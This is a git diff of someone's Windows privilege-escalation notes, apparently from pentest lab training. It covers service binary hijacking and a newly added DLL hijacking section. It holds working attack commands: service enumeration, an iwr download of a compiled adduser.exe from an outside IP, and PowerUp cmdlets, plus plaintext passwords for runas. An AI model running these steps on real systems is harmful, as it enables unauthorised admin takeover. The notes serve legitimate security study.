@@ -38,7 +38,7 @@ When you gain access to a windows user do steps bellow:
 
 #Service Binary hijacking
 
-      Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'} #enumerate running service
+      Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'} #enumerate running service and identify vulnerable service
       icacls "C:\xampp\mysql\bin\mysqld.exe" #to verify if we have permission to do the substitution of file
       x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
       iwr -uri http://192.168.45.233:8000/adduser.exe -Outfile adduser.exe 
@@ -55,6 +55,18 @@ When you gain access to a windows user do steps bellow:
       . .\PowerUp.ps1
       Get-ModifiableServiceFile
       Install-ServiceBinary -Name 'mysql'  #this command is going to fail because there a bug in a parameter use on a cmdlet, but you can use powerup to enumerate and finish the process manually.
+
+#Service DLL Hijacking
+      #standard search order to find a attached DLL
+            #1. The directory from which the application loaded.
+            #2. The system directory.
+            #3. The 16-bit system directory.
+            #4. The Windows directory. 
+            #5. The current directory.
+            #6. The directories that are listed in the PATH environment variable.
+      Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}  #enumerate running service and identify vulnerable service
+      icacls .\Documents\BetaServ.exe # to confirm that we don't have permission to change binario, if you have go to #Service Binary hijacking
+      
 
 runas /user:"richmond" "powershell -ep bypass"   # GothicLifeStyle1337!
 runas /user:"daveadmin" "powershell -ep bypass"   # qwertqwertqwert123!!
